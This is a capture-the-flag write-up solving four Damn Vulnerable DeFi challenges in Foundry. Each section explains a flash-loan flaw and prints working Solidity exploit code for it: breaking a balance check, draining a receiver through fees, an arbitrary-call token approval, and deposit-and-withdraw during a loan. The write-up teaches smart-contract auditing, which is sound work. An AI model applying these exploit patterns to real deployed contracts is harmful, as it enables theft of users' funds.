# Damn Vulnerable Defi Foundry Writeup #

Hi, my name is Juan,  i wrote this writeup to help anybody interested in develop Smart contract auditing skills. I previously resolved other challenges as Ethernaut and CaptureTheEther so i recommend try them before get into this more advanced Defi challenges so i will asume you have a previous basic knowledge.

Any comments/corrections please reach me at my twitter account: **@devnet0x**

## Challenge 1: Unstoppable ##
The vulnerability in this challenge is in the flashloan, previous to transfer tokens we have this condition:

        if (poolBalance != balanceBefore) revert AssertionViolated();

So, we as attacker's must transfer 1 token to lender pool to create a difference between poolBalance and balanceBefore. Then, nobody else will be able to borrow a flashloan:

```
   function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);
        dvt.transfer(address(unstoppableLender), 1 ether);
        vm.stopPrank();
        /** EXPLOIT END **/
        vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
        validation();
    }
```

Source Code:
https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/01_Unstoppable

## Challenge 2: NaiveReceiver ##

This time, you got to watch how is succesful challenge validated.

```
    function validation() internal {
        // All ETH has been drained from the receiver
        assertEq(address(flashLoanReceiver).balance, 0);
        assertEq(
            address(naiveReceiverLenderPool).balance,
            ETHER_IN_POOL + ETHER_IN_RECEIVER
        );
    }
```

So you can see that you need to transfer eth from receiver to lender. To do this, just call flashLoan function 10 times to transfer (consume)
all receiver ethers as fees. (Flashloan amount doesn't matter because fee is always 1 ETH)

```
    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }
```

Source Code:
https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/02_NaiveReceiver

## Challenge 3: Truster ##
The vulnerability in this challenge is that the flashloan let us execute any function in his own contract so we can approve tokens to our own attacker's addredd. The steps to drain all tokens are: Call the flashLoan function asking to borrow 0 token, so we will not need to pay back anything. This is important because the attacker does not own any DVT token.

```
        vm.startPrank(attacker);
        uint256 borrowAmt = 0;
```
Call the flashLoan with target as the DVT token address to execute the call method on the Token contract itself
```
        address targetContract = address(dvt);
```
Construct the data payload to make the TrusterLenderPool to call the DVT approve method
```
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            attacker,
            1000000 ether
        );
```
Call flashloan
```
        trusterLenderPool.flashLoan(borrowAmt, attacker, targetContract, data);
```
Transfer all tokens to attacker
```
        dvt.transferFrom(address(trusterLenderPool), attacker, 1000000 ether);
        vm.stopPrank();
```
Source Code:
https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/03_Truster

## Challenge 4: SideEntrance ##

The contract vulnerability is that you can cheat lender balance, depositing his own lender balance but under your account balance. To do that, you must build a contract that borrow ETH from the lender:

```
    function exploit(address _to) external {
        lenderContract.flashLoan(1000 ether);
        lenderContract.withdraw();
        payable(_to).transfer(1000 ether);
    }
```
Then, flashLoan function will call execute () function in our attacker's contract which will let us deposit borrowed ETH to the lender (so now ETH is in yor balance and contract balance is still 1000ETH). 
   
```
    function execute() external payable {
        lenderContract.deposit{value: 1000 ether}();
    }
``` 

This way you can pass and pay the flashloan:
        
        if (address(this).balance < balanceBefore)
        
Finally, in Foundry we just deploy our attacker contract:

``` 
    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);
        AttackerContract attackerContract = new AttackerContract(
            address(sideEntranceLenderPool)
        ); //deploy our attacker contract
        attackerContract.exploit(address(attacker));
        /** EXPLOIT END **/
        vm.stopPrank();
        validation();
    }
``` 

Source Code:
https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/04_SideEntrance
